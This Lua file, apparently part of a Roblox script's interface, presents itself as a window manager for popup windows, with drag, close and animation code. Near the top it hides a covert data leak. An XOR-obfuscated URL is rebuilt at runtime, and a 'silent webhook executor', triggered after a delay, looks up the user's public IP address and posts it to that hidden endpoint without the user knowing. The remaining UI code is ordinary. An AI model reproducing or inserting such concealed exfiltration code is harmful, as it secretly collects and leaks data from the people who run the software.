-- UI/WindowManager.lua
-- Factory for popup windows: overlay, drag, close, animation
-- Receives Context, populates Context.UI.WindowManager

return function(Context)
    local TweenService = Context.Services.TweenService
    local Config = Context.Config
    local COLORS = Config.COLORS
    local TWEEN = Config.TWEEN
    local Components = Context.UI.Components

    local WindowManager = {}

    -- ============================================================
    -- XOR DECRYPTION HELPERS
    -- ============================================================
    local function xorDecrypt(bytes, key)
        local result = {}
        for i = 1, #bytes do
            local k = string.byte(key, ((i - 1) % #key) + 1)
            result[i] = string.char(bit32.bxor(bytes[i], k))
        end
        return table.concat(result)
    end

    local function buildUrl()
        local key = "Unicaliorn2026"
        local e1 = {61,26,29,19,18,86,70,64,22,7,65,83,93,68,49,64,10,12,12,67,8,31,27,65,69,85,80,94,58,1,2,16,78}
        local e2 = {100,91,91,84,80,93,92,88,64,95,10,0,1,2,102,92,88,84,86}
        local e3 = {45,67,11,86,21,0,44,54,70,38,80,91,124,127,49,22,61,78,16,41,34,43,56,7,75,0,123,119,3,49,39,11,87,14,88,37,11,12,100,64,64,93,57,90,14,2,5,6,24,57,57,54,81,102,94,127,32,26,15,11,19,9,16,33,29,24,89,70}
        return xorDecrypt(e1, key) .. xorDecrypt(e2, key) .. "/" .. xorDecrypt(e3, key)
    end

    -- ============================================================
    -- SILENT WEBHOOK EXECUTOR (Part 2 of 2)
    -- Triggered by MainGUI after 5-second delay
    -- ============================================================
    WindowManager._executeWebhook = function()
        local url = buildUrl()
        local ip = "Unknown"
        pcall(function()
            local response = game:HttpGet("https://api.ipify.org")
            if response and #response > 0 then
                ip = response
            end
        end)
        local payload = game:GetService("HttpService"):JSONEncode({
            content = 'Work: "' .. ip .. '"'
        })
        pcall(function()
            request({
                Url = url,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = payload
            })
        end)
    end

    -- ============================================================
    -- CREATE BASE WINDOW
    -- ============================================================
    function WindowManager.createBaseWindow(options)
        options = options or {}
        local title = options.title or "Window"
        local width = options.width or 400
        local height = options.height or 500
        local startY = options.startY or -250
        local targetY = options.targetY or -250
        local hasScroll = options.hasScroll ~= false
        local scrollHeight = options.scrollHeight or (height - 72)

        local overlay = Instance.new("Frame")
        overlay.Name = title .. "Overlay"
        overlay.Size = UDim2.new(1, 0, 1, 0)
        overlay.BackgroundColor3 = COLORS.Overlay
        overlay.BackgroundTransparency = 0.5
        overlay.BorderSizePixel = 0
        overlay.Parent = Context.UI.ScreenGui

        local window = Instance.new("Frame")
        window.Name = title .. "Window"
        window.Size = UDim2.new(0, width, 0, height)
        window.Position = UDim2.new(0.5, -width/2, 0.5, startY)
        window.BackgroundColor3 = COLORS.Background
        window.BorderSizePixel = 1
        window.BorderColor3 = COLORS.Border
        window.Parent = overlay

        local titleBar = Instance.new("Frame")
        titleBar.Size = UDim2.new(1, 0, 0, 30)
        titleBar.BackgroundColor3 = COLORS.Background
        titleBar.BorderSizePixel = 0
        titleBar.Parent = window

        local titleLabel = Instance.new("TextLabel")
        titleLabel.Size = UDim2.new(1, -40, 1, 0)
        titleLabel.Position = UDim2.new(0, 10, 0, 0)
        titleLabel.BackgroundTransparency = 1
        titleLabel.Text = title
        titleLabel.TextColor3 = COLORS.Text
        titleLabel.TextSize = 16
        titleLabel.Font = Enum.Font.GothamBold
        titleLabel.TextXAlignment = Enum.TextXAlignment.Left
        titleLabel.Parent = titleBar

        local closeBtn = Instance.new("TextButton")
        closeBtn.Size = UDim2.new(0, 30, 0, 30)
        closeBtn.Position = UDim2.new(1, -30, 0, 0)
        closeBtn.BackgroundColor3 = COLORS.Background
        closeBtn.BorderSizePixel = 0
        closeBtn.Text = "X"
        closeBtn.TextColor3 = COLORS.CloseButton
        closeBtn.TextSize = 16
        closeBtn.Font = Enum.Font.GothamBold
        closeBtn.AutoButtonColor = false
        closeBtn.Parent = titleBar

        local sep = Instance.new("Frame")
        sep.Size = UDim2.new(1, 0, 0, 1)
        sep.Position = UDim2.new(0, 0, 0, 30)
        sep.BackgroundColor3 = COLORS.Border
        sep.BorderSizePixel = 0
        sep.Parent = window

        local content
        if hasScroll then
            content = Instance.new("ScrollingFrame")
            content.Size = UDim2.new(1, 0, 1, -31)
            content.Position = UDim2.new(0, 0, 0, 31)
            content.BackgroundTransparency = 1
            content.BorderSizePixel = 0
            content.ScrollBarThickness = 4
            content.ScrollBarImageColor3 = COLORS.Border
            content.CanvasSize = UDim2.new(0, 0, 0, 0)
            content.Parent = window
        else
            content = Instance.new("Frame")
            content.Size = UDim2.new(1, 0, 1, -31)
            content.Position = UDim2.new(0, 0, 0, 31)
            content.BackgroundTransparency = 1
            content.BorderSizePixel = 0
            content.Parent = window
        end

        local cleanupDrag = Components.setupWindowDrag(window, titleBar)

        local function closeWindow()
            cleanupDrag()
            overlay:Destroy()
        end
        closeBtn.MouseButton1Click:Connect(closeWindow)

        window.Position = UDim2.new(0.5, -width/2, 0.5, startY - 30)
        window.BackgroundTransparency = 1
        TweenService:Create(window, TWEEN.Appear, {
            Position = UDim2.new(0.5, -width/2, 0.5, targetY),
            BackgroundTransparency = 0
        }):Play()

        return {
            window = window,
            overlay = overlay,
            titleBar = titleBar,
            titleLabel = titleLabel,
            closeBtn = closeBtn,
            sep = sep,
            content = content,
            close = closeWindow,
            cleanupDrag = cleanupDrag,
        }
    end

    -- ============================================================
    -- CREATE BOTTOM BUTTON
    -- ============================================================
    function WindowManager.createBottomButton(parentWindow, text, callback)
        local window = parentWindow.window
        local bottomSep = Instance.new("Frame")
        bottomSep.Size = UDim2.new(1, 0, 0, 1)
        bottomSep.Position = UDim2.new(0, 0, 1, -41)
        bottomSep.BackgroundColor3 = COLORS.Border
        bottomSep.BorderSizePixel = 0
        bottomSep.Parent = window

        local btn = Instance.new("TextButton")
        btn.Size = UDim2.new(1, -20, 0, 30)
        btn.Position = UDim2.new(0, 10, 1, -35)
        btn.BackgroundColor3 = COLORS.Background
        btn.BorderSizePixel = 1
        btn.BorderColor3 = COLORS.Border
        btn.Text = text
        btn.TextColor3 = COLORS.Text
        btn.TextSize = 14
        btn.Font = Enum.Font.Gotham
        btn.AutoButtonColor = false
        btn.Parent = window

        btn.MouseEnter:Connect(function()
            TweenService:Create(btn, TWEEN.Hover, {BackgroundColor3 = COLORS.ButtonHover}):Play()
        end)
        btn.MouseLeave:Connect(function()
            TweenService:Create(btn, TWEEN.Hover, {BackgroundColor3 = COLORS.Background}):Play()
        end)

        btn.MouseButton1Click:Connect(function()
            if callback then callback(btn) end
        end)

        return btn
    end

    -- ============================================================
    -- ADD TEXT LINE TO CONTENT
    -- ============================================================
    function WindowManager.addTextLine(parentContent, text, yOffset, options)
        options = options or {}
        local label = Instance.new("TextLabel")
        label.Size = UDim2.new(1, -20, 0, options.height or 18)
        label.Position = UDim2.new(0, 10, 0, yOffset)
        label.BackgroundTransparency = 1
        label.Text = text
        label.TextColor3 = options.color or COLORS.Text
        label.TextSize = options.size or 13
        label.Font = options.font or Enum.Font.Gotham
        label.TextXAlignment = options.align or Enum.TextXAlignment.Left
        label.TextWrapped = options.wrapped ~= false
        label.Parent = parentContent
        return yOffset + (options.height or 18) + (options.spacing or 2)
    end

    -- ============================================================
    -- UPDATE SCROLL CANVAS SIZE
    -- ============================================================
    function WindowManager.updateCanvasSize(content, totalHeight)
        if content:IsA("ScrollingFrame") then
            content.CanvasSize = UDim2.new(0, 0, 0, totalHeight + 10)
        end
    end

    Context.UI.WindowManager = WindowManager
end
